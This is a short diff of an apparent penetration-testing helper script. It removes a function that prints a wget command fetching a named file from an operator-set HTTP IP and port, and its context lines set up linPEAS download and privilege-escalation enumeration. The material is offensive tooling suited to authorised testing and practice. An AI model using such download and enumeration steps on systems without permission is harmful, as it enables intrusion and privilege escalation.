@@ -63,23 +63,6 @@ linux_enumeration_auto() {
     echo unix_privesc_check standard >> linux_auto.sh
 }
 
-generate_download_linux() {
-    local file="$1"
-    if [ -z "$file" ]; then
-        echo "File name is required."
-        return 1
-    fi
-    file=$(echo "$file" | sed 's/ /%20/g') 
-    local output_option=""
-    if [ ! -z "$2" ]; then
-        output_option="-O \"$2\""
-    fi
-    if [ -z "$http_ip" ] || [ -z "$http_port" ]; then
-        echo "HTTP IP or port is not set."
-        return 1
-    fi
-    echo "wget http://$http_ip:$http_port/$file $output_option"
-}
 
 download_linpeas() {
     if [ ! -f "linpeas.sh" ]; then
